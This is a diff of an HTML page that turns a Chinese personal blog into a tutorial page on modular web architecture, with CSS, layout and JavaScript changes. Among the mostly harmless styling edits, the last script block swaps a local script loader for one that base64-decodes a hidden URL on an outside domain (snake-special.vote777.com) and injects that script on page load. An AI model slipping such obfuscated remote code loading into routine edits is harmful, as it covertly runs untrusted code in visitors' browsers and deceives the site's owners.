@@ -5,18 +5,17 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>浮光掠影 - 我的数字日志</title>
+    <title>现代Web架构：模块化设计</title>
     <style>
         body {
             overflow: hidden;
-            font-family: 'Lato', sans-serif;
-            /* 现代无衬线字体 */
+            font-family: 'Roboto', sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #EBF4F8;
-            /* 极浅淡蓝色背景 */
-            color: #4A6572;
-            /* 柔和的深青色文本 */
+            background-color: #F8F9FA;
+            /* 极浅灰色背景 */
+            color: #34495E;
+            /* 深灰蓝色文本 */
             line-height: 1.7;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
@@ -34,29 +33,44 @@
             /* 纯白色头部背景 */
             padding: 50px 20px;
             text-align: center;
-            border-bottom: 2px solid #A2D9CE;
-            /* 强调色细边框 */
+            border-bottom: 2px solid #E0E0E0;
+            /* 细底部边框 */
             box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
             position: relative;
             overflow: hidden;
         }
 
+        header::before {
+            /* 顶部几何图案 */
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at top left, rgba(102, 187, 106, 0.05) 0%, transparent 20%),
+                radial-gradient(circle at bottom right, rgba(102, 187, 106, 0.05) 0%, transparent 20%);
+            background-size: 100px 100px;
+            z-index: 0;
+        }
+
         header h1 {
             margin: 0;
-            font-family: 'Raleway', sans-serif;
-            /* 优雅标题字体 */
+            font-family: 'Montserrat', sans-serif;
             font-size: 3em;
-            color: #2C3E50;
-            /* 深色标题 */
+            color: #34495E;
             letter-spacing: 1px;
             text-transform: uppercase;
+            position: relative;
+            z-index: 1;
         }
 
         header p {
             font-size: 1.2em;
             color: #78909C;
-            /* 柔和灰色副标题 */
             margin-top: 15px;
+            position: relative;
+            z-index: 1;
         }
 
         nav {
@@ -64,7 +78,7 @@
             text-align: center;
             padding: 15px 0;
             margin-top: 30px;
-            border-radius: 10px;
+            border-radius: 8px;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
             position: sticky;
             top: 20px;
@@ -81,18 +95,18 @@
         }
 
         nav ul li {
-            margin: 0 20px;
+            margin: 0 18px;
         }
 
         nav ul li a {
-            color: #4A6572;
+            color: #546E7A;
             /* 默认文字颜色 */
             text-decoration: none;
             padding: 10px 0;
             position: relative;
             display: inline-block;
             font-weight: 600;
-            font-size: 1.05em;
+            font-size: 1em;
             transition: color 0.3s ease;
         }
 
@@ -101,8 +115,8 @@
             position: absolute;
             width: 0;
             height: 3px;
-            background-color: #A2D9CE;
-            /* 强调色 */
+            background-color: #66BB6A;
+            /* 强调色：亮绿色 */
             bottom: -8px;
             left: 50%;
             transform: translateX(-50%);
@@ -116,120 +130,138 @@
 
         nav ul li a:hover,
         nav ul li a:focus {
-            color: #A2D9CE;
-            /* 强调色 */
+            color: #66BB6A;
+        }
+
+        nav ul li a.active {
+            /* 激活状态样式 */
+            color: #66BB6A;
+        }
+
+        nav ul li a.active::after {
+            width: 100%;
         }
 
         main {
             padding-top: 30px;
+            display: grid;
+            /* 网格布局 */
+            grid-template-columns: 1fr;
+            /* 默认单列 */
+            gap: 30px;
+            /* 网格间距 */
         }
 
-        .article-card {
+        @media (min-width: 768px) {
+            main {
+                grid-template-columns: 1fr 1fr;
+                /* 768px以上两列 */
+            }
+        }
+
+        @media (min-width: 1024px) {
+            main {
+                grid-template-columns: 1fr 1fr 1fr;
+                /* 1024px以上三列 */
+            }
+        }
+
+        section {
             background-color: #FFFFFF;
-            margin-bottom: 40px;
             padding: 35px;
-            border-radius: 15px;
+            border-radius: 10px;
             box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            opacity: 0;
-            /* 初始隐藏 */
-            transform: translateY(20px);
-            /* 初始位置 */
+            position: relative;
+            overflow: hidden;
+            border-left: 5px solid #90A4AE;
+            /* 柔和的左侧边框 */
         }
 
-        .article-card.fade-in {
-            opacity: 1;
-            transform: translateY(0);
-            transition: opacity 0.6s ease-out, transform 0.6s ease-out;
-        }
-
-        .article-card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
-        }
-
-        .article-card h2 {
-            font-family: 'Raleway', sans-serif;
-            font-size: 2.2em;
-            color: #2C3E50;
+        section h2 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 2em;
+            color: #34495E;
             margin-top: 0;
-            margin-bottom: 15px;
-            line-height: 1.3;
-        }
-
-        .article-card .date {
-            font-size: 0.9em;
-            color: #90A4AE;
             margin-bottom: 20px;
-            display: block;
-            border-bottom: 1px dashed #CFD8DC;
+            border-bottom: 1px dashed #E0E0E0;
+            /* 虚线分隔 */
             padding-bottom: 10px;
         }
 
-        .article-card p {
-            font-size: 1.05em;
-            color: #546E7A;
-            margin-bottom: 25px;
+        section h3 {
+            font-size: 1.5em;
+            color: #66BB6A;
+            /* 强调色 */
+            margin-top: 25px;
+            margin-bottom: 10px;
         }
 
-        .article-card img {
+        section p {
+            font-size: 1.05em;
+            color: #546E7A;
+            margin-bottom: 20px;
+        }
+
+        section img {
             max-width: 100%;
             height: auto;
             display: block;
-            margin: 30px auto;
-            border-radius: 10px;
+            margin: 25px auto;
+            border-radius: 8px;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
             border: 2px solid #CFD8DC;
             /* 柔和边框 */
         }
 
-        .read-more {
-            display: inline-block;
-            background-color: #A2D9CE;
-            /* 强调色按钮 */
-            color: #2C3E50;
-            /* 深色文字 */
-            padding: 12px 28px;
+        pre {
+            background-color: #263238;
+            /* 深炭灰色代码背景 */
+            color: #A2F2A2;
+            /* 亮绿色代码文本 */
+            padding: 20px;
             border-radius: 8px;
-            text-decoration: none;
-            font-weight: bold;
-            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+            overflow-x: auto;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9em;
+            margin-bottom: 25px;
+            border: 1px solid #66BB6A;
+            /* 强调色边框 */
+            box-shadow: 0 0 10px rgba(102, 187, 106, 0.4);
         }
 
-        .read-more:hover {
-            background-color: #88C0B5;
-            /* 悬停深色 */
-            transform: translateY(-3px);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
+        code {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9em;
+            color: #A2F2A2;
+        }
+
+        pre code {
+            color: #A2F2A2;
         }
 
         footer {
-            background-color: #2C3E50;
-            /* 深色页脚背景 */
-            color: #EBF4F8;
-            /* 浅色文本 */
+            background-color: #34495E;
+            /* 深灰蓝色页脚背景 */
+            color: #F8F9FA;
             padding: 40px 0;
             text-align: center;
             font-size: 0.9em;
             margin-top: 50px;
-            border-top: 2px solid #A2D9CE;
-            /* 强调色边框 */
+            border-top: 2px solid #66BB6A;
+            /* 强调色顶部边框 */
             box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.2);
         }
 
-        .social-links a {
-            color: #EBF4F8;
+        .footer-links a {
+            color: #F8F9FA;
             text-decoration: none;
-            margin: 0 20px;
-            font-size: 1.4em;
-            transition: color 0.3s ease, transform 0.2s ease;
+            margin: 0 18px;
+            font-size: 1.1em;
+            transition: color 0.3s ease;
         }
 
-        .social-links a:hover {
-            color: #A2D9CE;
-            /* 强调色 */
-            transform: translateY(-3px) scale(1.1);
+        .footer-links a:hover {
+            color: #66BB6A;
         }
     </style>
     <link rel="stylesheet" href="./static/css/style.css">
@@ -238,63 +270,105 @@
 <body>
     <header>
         <div class="container">
-            <h1>浮光掠影</h1>
-            <p>捕捉生活中的灵感瞬间</p>
+            <h1>现代Web架构</h1>
+            <p>模块化设计与开发实践</p>
         </div>
     </header>
 
     <div class="container">
         <nav id="mainNav">
             <ul>
-                <li><a href="#latest-entries">最新日志</a></li>
-                <li><a href="#categories">分类</a></li>
-                <li><a href="#about-me">关于我</a></li>
-                <li><a href="#contact">联系</a></li>
+                <li><a href="#introduction">引言</a></li>
+                <li><a href="#modules">模块化</a></li>
+                <li><a href="#patterns">设计模式</a></li>
+                <li><a href="#performance">性能优化</a></li>
             </ul>
         </nav>
 
         <main>
-            <section id="latest-entries">
-                <h2>最新日志</h2>
-                <div class="article-list">
-                    <div class="article-card">
-                        <img src="https://picsum.photos/300/200?random=1&tag=sky-clouds-alpha" alt="天空与云朵"
-                            class="random-image">
-                        <h2>云端漫步：数字世界的遐想</h2>
-                        <span class="date">2025年07月29日</span>
-                        <p>在数字的海洋中，思绪如同云朵般自由飘荡。记录下这些无拘无束的遐想，是通往内心深处的旅程。</p>
-                        <a href="#" class="read-more">阅读更多</a>
-                    </div>
+            <section id="introduction">
+                <h2>引言：可伸缩架构</h2>
+                <img src="https://picsum.photos/300/200?random=1&tag=architecture-diagram-abc" alt="架构图"
+                    class="random-image">
+                <p>构建可伸缩、可维护的Web应用是现代开发的核心挑战。本指南将深入探讨模块化设计原则，帮助您构建健壮且适应未来需求的应用。</p>
+                <p>我们将从基础概念开始，逐步深入到高级设计模式和性能优化策略。</p>
+            </section>
 
-                    <div class="article-card">
-                        <img src="https://picsum.photos/300/200?random=2&tag=minimalist-desk-beta" alt="极简桌面"
-                            class="random-image">
-                        <h2>极简生活美学：桌面整理的艺术</h2>
-                        <span class="date">2025年07月25日</span>
-                        <p>一个整洁的桌面，往往能带来清晰的思维。本文分享了我的极简桌面整理心得，以及它如何影响我的工作效率。</p>
-                        <a href="#" class="read-more">阅读更多</a>
-                    </div>
+            <section id="modules">
+                <h2>模块化：代码组织艺术</h2>
+                <img src="https://picsum.photos/300/200?random=2&tag=code-blocks-def" alt="代码块" class="random-image">
+                <p>模块化是管理复杂代码库的关键。通过将代码分解为独立的、可复用的模块，可以提高代码的可读性、可维护性和协作效率。</p>
+                <pre><code>// ES6 模块导出
+export const PI = 3.14159;
 
-                    <div class="article-card">
-                        <img src="https://picsum.photos/300/200?random=3&tag=coffee-art-gamma" alt="咖啡拉花"
-                            class="random-image">
-                        <h2>咖啡与灵感：味蕾上的创作</h2>
-                        <span class="date">2025年07月18日</span>
-                        <p>一杯香醇的咖啡，不仅是味蕾的享受，更是灵感的源泉。探索咖啡制作的艺术，以及它如何激发我的创意。</p>
-                        <a href="#" class="read-more">阅读更多</a>
-                    </div>
-                </div>
+export function add(a, b) {
+    return a + b;
+}
+
+// ES6 模块导入
+import { PI, add } from './math.js';
+console.log(add(PI, 5));</code></pre>
+                <p>模块化不仅限于JavaScript，也适用于CSS和HTML结构。</p>
+            </section>
+
+            <section id="patterns">
+                <h2>设计模式：通用解决方案</h2>
+                <img src="https://picsum.photos/300/200?random=3&tag=design-patterns-ghi" alt="设计模式"
+                    class="random-image">
+                <p>设计模式是软件开发中常见问题的通用、可重用的解决方案。理解并应用这些模式可以帮助我们编写更优雅、更健壮的代码。</p>
+                <p>例如，观察者模式在事件驱动的系统中非常常见，而工厂模式则用于创建对象。</p>
+                <pre><code>// 简单的观察者模式示例
+class Subject {
+    constructor() {
+        this.observers = [];
+    }
+
+    addObserver(observer) {
+        this.observers.push(observer);
+    }
+
+    notify(data) {
+        this.observers.forEach(observer => observer.update(data));
+    }
+}
+
+class Observer {
+    constructor(name) {
+        this.name = name;
+    }
+
+    update(data) {
+        console.log(`${this.name} 收到更新: ${data}`);
+    }
+}
+
+const subject = new Subject();
+const obs1 = new Observer('观察者A');
+const obs2 = new Observer('观察者B');
+
+subject.addObserver(obs1);
+subject.addObserver(obs2);
+
+subject.notify('新消息到达！');</code></pre>
+            </section>
+
+            <section id="performance">
+                <h2>性能优化：提升用户体验</h2>
+                <img src="https://picsum.photos/300/200?random=4&tag=performance-speed-jkl" alt="性能速度"
+                    class="random-image">
+                <p>优化Web应用性能对于提升用户体验至关重要。这包括减少加载时间、提高响应速度和确保流畅的动画。</p>
+                <p>常见的优化技术包括代码分割、懒加载、图片优化和使用CDN等。</p>
             </section>
         </main>
     </div>
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 浮光掠影. 版权所有.</p>
-            <div class="social-links">
-                <a href="#" target="_blank">微博</a> |
-                <a href="#" target="_blank">知乎</a> |
-                <a href="#" target="_blank">简书</a>
+            <p>&copy; 2025 Web架构指南. 版权所有.</p>
+            <div class="footer-links">
+                <a href="#" target="_blank">资源</a> |
+                <a href="#" target="_blank">联系</a> |
+                <a href="#" target="_blank">关于</a>
             </div>
         </div>
     </footer>
@@ -326,40 +400,47 @@
                 });
             });
 
-            const articleCards = document.querySelectorAll('.article-card');
+            const sections = document.querySelectorAll('main section');
+            const navLinks = document.querySelectorAll('nav ul li a');
 
-            const observerOptions = {
-                root: null,
-                rootMargin: '0px',
-                threshold: 0.2
-            };
+            function highlightNavLink() {
+                let currentSectionId = '';
 
-            const observer = new IntersectionObserver((entries, observer) => {
-                entries.forEach(entry => {
-                    if (entry.isIntersecting) {
-                        entry.target.classList.add('fade-in');
-                        observer.unobserve(entry.target);
+                sections.forEach(section => {
+                    const sectionTop = section.offsetTop - document.querySelector('nav').offsetHeight - 30;
+                    const sectionBottom = sectionTop + section.offsetHeight;
+
+                    if (window.pageYOffset >= sectionTop && window.pageYOffset < sectionBottom) {
+                        currentSectionId = section.id;
                     }
                 });
-            }, observerOptions);
 
-            articleCards.forEach(card => {
-                observer.observe(card);
-            });
+                navLinks.forEach(link => {
+                    link.classList.remove('active');
+                    if (link.getAttribute('href').substring(1) === currentSectionId) {
+                        link.classList.add('active');
+                    }
+                });
+            }
+
+            window.addEventListener('scroll', highlightNavLink);
+            highlightNavLink();
         });
     </script>
     <script>
         (function () {
             function init() {
-                const timestamp = Date.now()
-                const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
-                const script = document.createElement("script")
-                script.src = url
-                document.body.appendChild(script)
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
             }
-            init()
-        })()
+            init();
+        })();
     </script>
 
 </body>
